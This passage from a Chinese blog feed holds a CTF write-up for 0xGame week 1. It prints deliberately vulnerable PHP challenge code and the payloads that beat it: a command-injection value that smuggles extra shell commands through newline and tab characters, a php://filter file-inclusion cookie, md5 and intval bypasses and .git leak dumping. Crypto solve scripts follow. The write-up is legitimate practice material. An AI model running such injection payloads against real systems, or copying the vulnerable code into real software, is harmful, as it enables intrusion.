href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247487933&idx=1&sn=e57bc3583c1b80f1aa7bd08409cfb82d">从qwb webshell 题深入快速析构</a></p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">愚人杯3rd [easy_php]</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123859246">PHP之序列化与反序列化（原生类应用篇上）</a></p><p><a href="https://dar1in9s.github.io/2020/04/02/php/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">PHP原生类的反序列化利用</a></p><p><a href="https://blog.csdn.net/qq_43632414/article/details/120499159">PHP反序列化——字符逃逸漏洞（肯定能看懂的！）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PHP </category>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> 知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame_week1</title>
      <link href="/0xGame-week1/"/>
      <url>/0xGame-week1/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-week1"><a href="#0xGame-week1" class="headerlink" title="0xGame_week1"></a>0xGame_week1</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>F12，点击源代码&#x2F;来源，查看js文件，即可得到flag。</p><p><img src="/0xGame-week1/w_2_1.png"></p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>查看源码，看到提示。</p><p><img src="/0xGame-week1/w_1_1.png"></p><p>按照提示访问<code>/api.php?source</code>，即可得到源码 。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;No IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">sanitize</span>(<span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>. <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知，过滤了<code>flag</code>、<code>;</code>、<code> 空格( )</code>、<code>/</code>。</p><p>使用 <code>回车(%0a)</code> 代替<code>;</code>截断命令。用 <code>tab(%09)</code> 代替空格，使用cd命令一直跳转到根目录即可查看flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1%0acd%09..%0acd%09..%0acd%09..%0acat%09f*%0a</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_1_2.png"></p><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用数组绕md5，用小数+字符绕过<code>if (!is_numeric($c) &amp;&amp; $c != 1024 &amp;&amp; intval($c) == 1024)</code>，用伪协议读flag.php，base64解码后即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: url/?a[]=1&amp;b[]=2</span><br><span class="line">post: c=1024.11a</span><br><span class="line">cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_3_1.png"></p><h2 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h2><ol><li><p>get传<code>query=ctf</code>;</p></li><li><p>post传<code>action=getflag</code>;</p></li><li><p>cookie传<code>role=admin</code>；</p></li><li><p>添加<code>X-Forwarded-For: 127.0.0.1</code>;</p></li><li><p>修改<code>User-Agent</code>为<code>HarmonyOS Browser</code>；</p></li><li><p>添加<code>Referer: ys.mihoyo.com</code>。</p><p><img src="/0xGame-week1/w_4_1.png"></p></li></ol><h2 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h2><p>用<code>dirsearch</code>扫描，发现有<code>.git</code>泄露。</p><p>使用 <a href="https://github.com/BugScanTeam/GitHack#githack">GitHack</a> 下载源码。</p><p><img src="/0xGame-week1/w_5_1.png"></p><p>然后进入<code>dist/124.71.184.68_50013</code>，打开终端，输入<code>git log</code>，可以看到历史版本。</p><p><img src="/0xGame-week1/w_5_2.png"></p><p>输入<code>git show</code>，即可找到flag。</p><p><img src="/0xGame-week1/w_5_3.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="BabyRSA"><a href="#BabyRSA" class="headerlink" title="BabyRSA"></a>BabyRSA</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getN</span>():</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">tmp = getPrime(<span class="number">32</span>)</span><br><span class="line">N *= tmp</span><br><span class="line"><span class="keyword">return</span> N</span><br><span class="line"></span><br><span class="line">mask = getrandbits(<span class="number">256</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = getN()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m*mask,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;mask = <span class="subst">&#123;mask&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"><span class="string">mask = 54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>用 <a href="http://www.factordb.com/">在线网站</a> 分解n。</p><p><img src="/0xGame-week1/c_1_1.png"></p><p>得到pq后带入常规脚本中解密。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">n=<span class="number">93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pq=[<span class="number">2329990801</span>,<span class="number">2436711469</span>,<span class="number">2732757047</span>,<span class="number">2770441151</span>,<span class="number">2821163021</span>,<span class="number">2864469667</span>,<span class="number">2995527113</span>,<span class="number">3111632101</span>,<span class="number">3162958289</span>,<span class="number">3267547559</span>,<span class="number">3281340371</span>,<span class="number">3479527847</span>,<span class="number">3561068417</span>,<span class="number">3978177241</span>,<span class="number">4134768233</span>,<span class="number">4160088337</span>]</span><br><span class="line">c=<span class="number">54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pq:</span><br><span class="line">    phi*=(i-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m1//mask)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Magic_M@th_Make_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h2><p>密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0dGmqk&#123;79ap4i0522g0a67m6i196he52357q60f&#125; </span><br></pre></td></tr></table></figure><p>根据flag头是<code>0xGame</code>，反推出密钥是<code>game</code>，最后找一个在线网站解密即可得到flag。</p><h2 id="密码，觅码，先有-再密"><a href="#密码，觅码，先有-再密" class="headerlink" title="密码，觅码，先有*再密"></a>密码，觅码，先有*再密</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment">#从中导入秘密的flag，这是我们要破解的信息</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="comment">#从函数库导入一些编码函数</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="comment">#hint:也许下列函数库会对你有些帮助，但是要怎么用呢……</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">flag = flag.encode()</span><br><span class="line">lent = <span class="built_in">len</span>(flag)</span><br><span class="line">flag = [flag[i*(lent//<span class="number">4</span>):(i+<span class="number">1</span>)*(lent//<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]<span class="comment">#将flag切割成四份</span></span><br><span class="line"></span><br><span class="line">c1 = bytes_to_long(flag[<span class="number">0</span>])</span><br><span class="line">c2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">1</span>]])</span><br><span class="line">c3 = b64encode(flag[<span class="number">2</span>])</span><br><span class="line">c4 = flag[<span class="number">3</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1?= <span class="subst">&#123;<span class="built_in">pow</span>(c1,<span class="number">5</span>)&#125;</span>\nc2 = <span class="subst">&#123;c2&#125;</span>\nc3 = <span class="subst">&#123;c3&#125;</span>\nc4 = <span class="subst">&#123;c4&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1?= 2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line"><span class="string">c2 = 10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100</span></span><br><span class="line"><span class="string">c3 = b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line"><span class="string">c4 = e4bbace79a8443727970746fe68c91e68898e590a72121217d</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#全是乱码，那咋办嘛？</span></span><br></pre></td></tr></table></figure><p>根据源码，我们要先将c1开5次方再转成bytes，c2以8位长度位基准分割出字符，c3进行base64解码，c4进行hex解码，然后拼接起来再decode解码即可得到flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c1= <span class="number">2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line">c2 = <span class="string">&quot;10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100&quot;</span></span><br><span class="line">c3 = <span class="string">b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line">c4 = <span class="string">&quot;e4bbace79a8443727970746fe68c91e68898e590a72121217d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_hex</span>(<span class="params">c</span>):</span><br><span class="line">    m = <span class="built_in">len</span>(c)//<span class="number">8</span></span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        str1=c[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        a = <span class="built_in">int</span>(str1,<span class="number">2</span>)</span><br><span class="line">        flag+=<span class="built_in">hex</span>(a)[<span class="number">2</span>:]</span><br><span class="line">        <span class="comment">#print(i,hex(a)[2:])</span></span><br><span class="line">        <span class="comment">#print(i,str1)</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">a2=bin_to_hex(c2)</span><br><span class="line">c11=iroot(c1,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(c11[<span class="number">0</span>]))+<span class="built_in">bytes</span>.fromhex(a2)+b64decode(c3)+<span class="built_in">bytes</span>.fromhex(c4)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="What’s-CBC"><a href="#What’s-CBC" class="headerlink" title="What’s CBC?"></a>What’s CBC?</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(text)%<span class="number">8</span>:</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">pad = <span class="number">8</span>-(<span class="built_in">len</span>(text)%<span class="number">8</span>)</span><br><span class="line">text += pad.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)*pad</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">text = pad(text)</span><br><span class="line">block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">tmp = bytes_xor(iv,i)</span><br><span class="line">iv = encrypt(tmp,key)</span><br><span class="line">result += iv</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = (Encrypt_CBC(flag,iv,key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc = b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br></pre></td></tr></table></figure><p>分析源码，可以知道这里面缺少了<code>key</code>。</p><p><code>Encrypt_CBC</code>是先将flag分成长度为8的多个字符串，然后再单独处理。每一个字符串先<code>bytes_xor(iv,i)</code>，再<code>encrypt(tmp,key)</code>并更新iv，新的iv是加密后的字符，最后再拼接起来。</p><p><code>bytes_xor</code>是将部分<code>flag</code>与<code>iv</code>异或。</p><p><code>encrypt</code>函数是将<code>text</code>的每一位的值都与<code>key</code>异或，由此推断出key是一个数字。</p><p>使用flag头<code>0xGame&#123;&#125;</code>可以推断出key为143.</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#text = pad(text)</span></span><br><span class="line">    block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line">    <span class="built_in">print</span>(block)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">        iv1 = decrypt(i,key)</span><br><span class="line">        tmp = bytes_xor(iv,iv1)</span><br><span class="line">        result += tmp</span><br><span class="line">        iv=i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line">key=<span class="number">143</span>   </span><br><span class="line">enc = <span class="string">b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(enc))</span><br><span class="line">flag = decrypt_CBC(enc,iv,key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;098f6bcd4621d373cade4e832627b4f6&#125;\x08\x08\x08\x08\x08\x08\x08\x08&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="猜谜"><a href="#猜谜" class="headerlink" title="猜谜"></a>猜谜</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">text = text.decode()</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">unpad = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">text = text[:-<span class="number">1</span>]</span><br><span class="line">unpad = -<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">text = text[:-<span class="number">2</span>]</span><br><span class="line">unpad = -<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">tmp = tmp[:unpad]</span><br><span class="line">result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">text</span>):</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])</span><br><span class="line">length = <span class="built_in">len</span>(text)</span><br><span class="line">pad = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> length%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">text += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;==&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> length%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">text += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;=&#x27;</span></span><br><span class="line">result = [code[<span class="built_in">int</span>(text[<span class="number">3</span>*i:<span class="number">3</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(text)//<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result).encode()+pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">flag</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">result += (key[i%<span class="number">7</span>]^(flag[i]+i)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = enc(encrypt(flag))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>没有密钥，拿flag头<code>0xGame&#123;</code>去推。</p><p>由<code>(key[i%7]^(flag[i]+i))</code>可以知道<code>key</code>的长度是7 。</p><p>源码自带了<code>dec</code>的源码，不用纠结<code>enc</code>了。</p><p>分析<code>encrypt</code>，可以知道加密过程是<code>移位+异或</code>。</p><p>解密脚本</p><figure 